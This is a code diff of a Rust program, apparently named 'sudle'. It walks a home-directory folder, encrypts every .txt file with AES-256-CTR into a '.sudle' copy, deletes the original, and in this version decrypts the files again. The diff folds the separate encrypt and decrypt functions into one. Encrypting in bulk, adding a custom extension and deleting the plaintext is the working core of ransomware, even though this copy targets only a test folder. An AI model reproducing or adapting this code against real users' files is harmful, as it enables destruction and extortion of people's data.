@@ -5,7 +5,7 @@ use dirs;
 use rand::{thread_rng, Rng};
 use std::{
     fs::{self, File},
-    io::{self, Read, Write},
+    io::{Read, Write},
 };
 use walkdir::WalkDir;
 
@@ -20,10 +20,11 @@ fn main() {
     let full = format!("{home}/projects/sudle/test_files", home = home.display());
     let paths = search_txt_files(&full);
     for file_path in paths {
-        let output_file_path = format!("{}.sudle", file_path);
-        match encrypt_delete(&file_path, &output_file_path, &key) {
+        let file_new_path = remove_suffix(&file_path, ".txt");
+        let output_file_path = format!("{}.sudle", file_new_path);
+        match encrypt_decrypt(&file_path, &key, false) {
             Ok(path) => {
-                match decrypt_delete(path.as_str(), file_path.as_str(), &key){
+                match encrypt_decrypt(path.as_str(), &key, true){
                     Ok(file_path) => println!("{} processed successfully", file_path),
                     Err(e) => println!("Error processing {}: {:?}", file_path, e),
                 }
@@ -69,66 +70,59 @@ fn search_txt_files(start_path: &str) -> Vec<String> {
     paths
 }
 
-fn encrypt_delete(
+fn encrypt_decrypt(
     input_file_path: &str,
-    output_file_path: &str,
     key: &[u8; 32],
+    decrypt: bool,
 ) -> Result<String, String> {
     // Open the input file and read its contents
     let mut input_file = File::open(input_file_path).expect("could not open file");
     let mut contents = Vec::new();
     input_file.read_to_end(&mut contents).expect("could not read file");
 
-    // Generate a random nonce for CTR mode
+    // Determine the output file path based on the operation
+    let output_file_path = if decrypt {
+        remove_suffix(input_file_path, ".sudle")
+    } else {
+        input_file_path.to_string() + ".sudle"
+    };
+
     let mut nonce = [0u8; 16];
-    thread_rng().fill(&mut nonce);
+    let contents_to_process;
+
+    if decrypt {
+        // For decryption, read the nonce from the start of the file
+        nonce.copy_from_slice(&contents[0..16]);
+        contents_to_process = &contents[16..];
+    } else {
+        // For encryption, generate a random nonce
+        thread_rng().fill(&mut nonce);
+        contents_to_process = &contents[..];
+    }
 
     // Create the cipher instance
-    let cipher = Aes256Ctr::new_from_slices(key, &nonce).unwrap();
+    let mut cipher = Aes256Ctr::new_from_slices(key, &nonce).unwrap();
 
-    // Encrypt the contents in place
-    let mut buffer = contents.clone();
-    cipher.clone().apply_keystream(&mut buffer);
+    // Process the contents in place
+    let mut buffer = contents_to_process.to_vec();
+    cipher.apply_keystream(&mut buffer);
 
-    // Open the output file and write the nonce followed by the encrypted contents
-    let mut output_file = File::create(output_file_path).expect("could not create file");
-    output_file.write_all(&nonce).expect("could not write nonce");
-    output_file.write_all(&buffer).expect("could not write encrypted file");
-    match fs::remove_file(input_file_path){
-        Ok(_) => Ok(output_file_path.to_string()),
-        Err(_) => Err("could not delete file".to_string()),
+    // Open the output file and write the processed contents
+    let mut output_file = File::create(&output_file_path).expect("could not create file");
+    if !decrypt {
+        // Write the nonce before the encrypted contents only during encryption
+        output_file.write_all(&nonce).expect("could not write nonce");
     }
+    output_file.write_all(&buffer).expect("could not write processed file");
+
+    // Optionally, remove the original file
+    fs::remove_file(input_file_path).expect("could not delete original file");
+
+    Ok(output_file_path)
 }
 
-fn decrypt_delete(
-    input_file_path: &str,
-    output_file_path: &str,
-    key: &[u8; 32],
-) -> Result<String, String> {
-    // Open the input file and read its contents
-    let mut input_file = File::open(input_file_path).expect("could not open file");
-    let mut contents = Vec::new();
-    input_file.read_to_end(&mut contents).expect("could not read file");
 
-    let output_file_path = remove_suffix(input_file_path, ".sudle");
-    // Extract the nonce and the encrypted contents
-    let (nonce, encrypted) = contents.split_at(16);
 
-    // Create the cipher instance
-    let cipher = Aes256Ctr::new_from_slices(key, nonce).unwrap();
-
-    // Decrypt the contents in place
-    let mut buffer = encrypted.to_vec();
-    cipher.clone().apply_keystream(&mut buffer);
-
-    // Open the output file and write the decrypted contents
-    let mut output_file = File::create(output_file_path.clone()).expect("could not create file");
-    output_file.write_all(&buffer).expect("could not encrypt file");
-    match fs::remove_file(input_file_path){
-        Ok(_) => Ok(output_file_path.to_string()),
-        Err(_) => Err("could not delete file".to_string()),
-    }
-}
 fn remove_suffix(input: &str, suffix: &str) -> String {
     if input.ends_with(suffix) {
         // Trim the suffix from the input string
